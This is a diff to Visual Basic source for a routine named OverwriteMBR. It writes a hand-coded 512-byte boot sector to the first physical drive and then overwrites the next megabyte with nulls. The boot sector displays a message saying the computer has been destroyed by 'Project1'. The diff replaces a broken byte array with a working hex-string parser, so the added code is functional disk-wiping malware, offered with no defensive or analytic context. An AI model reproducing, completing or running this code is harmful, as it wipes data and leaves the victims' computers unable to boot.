@@ -16,23 +16,29 @@ Public Const OPEN_ALWAYS = 4
 Public Const TRUNCATE_EXISTING = 5
 Sub OverwriteMBR()
     Dim hFile As Long
-    ReDim buffer(0 To 511) As Byte
-    Dim bytesWritten As Long
-    
-        buffer = Array(Chr(&HE9), Chr(&H0), Chr(&H0), Chr(&HB4), Chr(&HE), Chr(&HB0), Chr(&H59), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H6F), Chr(&HCD), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H75), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H72), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0, Chr(&H20), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H63), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H6F), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H6D), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H70), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H75), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), _
-        Chr(&H74), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H65), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H72), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H20), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H68), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H61), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H64), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H20), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H62), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H65), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H65), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H6E), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), _
-        Chr(&H20), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H64), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H65), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H73), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H74), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H72), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H6F), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H79), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H65), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H64), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H20), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H62), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), _
-        Chr(&H79), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H20), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H50), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H72), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H6F), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H6A), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H65), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H63), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H74), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H31), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H21), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HB0), Chr(&H20), Chr(&HCD), Chr(&H10), Chr(&HF4), Chr(&HE9), _
-        Chr(&H0), Chr(&H0), Chr(&HB4), Chr(&H6), Chr(&HB0), Chr(&H0), Chr(&HFE), Chr(&HC7), Chr(&HB5), Chr(&H0), Chr(&HB1), Chr(&H0), Chr(&HB6), Chr(&H19), Chr(&HB2), Chr(&H50), Chr(&HCD), Chr(&H10), Chr(&HE9), Chr(&HED), Chr(&HFF), Chr(&H50), Chr(&H52), Chr(&HB9), Chr(&H7), Chr(&H0), Chr(&HBA), Chr(&H40), Chr(&H42), Chr(&HB8), Chr(&H86), Chr(&H0), Chr(&HCD), Chr(&H15), Chr(&H5A), Chr(&H58), Chr(&HC3), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), _
-        Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), _
-        Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), _
-        Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), _
-        Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H0), Chr(&H55), Chr(&HAA))
-    hFile = CreateFile("\\.\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ Or FILE_SHARE_WRITE, ByVal 0&, OPEN_EXISTING, ByVal 0&, ByVal 0&)
-        If hFile = &HFFFFFFFF Then RaiseError
-        WriteFile hFile, buffer(0), UBound(buffer) + 1, bytesWritten, ByVal 0&
-        If bytesWritten < UBound(buffer) + 1 Then RaiseError
-        WriteFile hFile, String(1048576, vbNullString), 1048576, bytesWritten, ByVal 0&
-        If bytesWritten < 1048576 Then RaiseError
+    Dim buffer2() As String
+    Dim buffer(511) As Byte
+    Dim value As Integer
+    string1 = "E9 00 00 B4 0E B0 59 CD 10 F4 B0 6F CD 10 F4 B0 75 CD 10 F4 B0 72 CD 10 F4 B0 20 CD 10 F4 B0 63 CD 10 F4 B0 6F CD 10 F4 B0 6D CD 10 F4 B0 70 CD 10 F4 B0 75 " & _
+            "CD 10 F4 B0 74 CD 10 F4 B0 65 CD 10 F4 B0 72 CD 10 F4 B0 20 CD 10 F4 B0 68 CD 10 F4 B0 61 CD 10 F4 B0 64 CD 10 F4 B0 20 CD 10 F4 B0 62 CD 10 F4 B0 65 CD 10 " & _
+            "F4 B0 65 CD 10 F4 B0 6E CD 10 F4 B0 20 CD 10 F4 B0 64 CD 10 F4 B0 65 CD 10 F4 B0 73 CD 10 F4 B0 74 CD 10 F4 B0 72 CD 10 F4 B0 6F CD 10 F4 B0 79 CD 10 F4 B0 " & _
+            "65 CD 10 F4 B0 64 CD 10 F4 B0 20 CD 10 F4 B0 62 CD 10 F4 B0 79 CD 10 F4 B0 20 CD 10 F4 B0 50 CD 10 F4 B0 72 CD 10 F4 B0 6F CD 10 F4 B0 6A CD 10 F4 B0 65 CD " & _
+            "10 F4 B0 63 CD 10 F4 B0 74 CD 10 F4 B0 31 CD 10 F4 B0 21 CD 10 F4 B0 20 CD 10 F4 E9 00 00 B4 06 B0 00 FE C7 B5 00 B1 00 B6 19 B2 50 CD 10 E9 ED FF 50 52 B9 " & _
+            "07 00 BA 40 42 B8 86 00 CD 15 5A 58 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " & _
+            "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " & _
+            "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " & _
+            "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " & _
+            "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 55 AA"
+    buffer2 = Split(string1, " ")
+    For i = 0 To 511
+        value = Val("&H" & buffer2(i))
+        buffer(i) = value
+    Next
+	hFile = CreateFile("\\.\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ Or FILE_SHARE_WRITE, ByVal 0&, OPEN_EXISTING, ByVal 0&, ByVal 0&)
+	If hFile = &HFFFFFFFF Then RaiseError
+	WriteFile hFile, buffer(0), UBound(buffer) + 1, bytesWritten, ByVal 0&
+	If bytesWritten < UBound(buffer) + 1 Then RaiseError
+	WriteFile hFile, String(1048576, vbNullChar), 1048576, bytesWritten, ByVal 0&
+	If bytesWritten < 1048576 Then RaiseError
     CloseHandle hFile
 End Sub
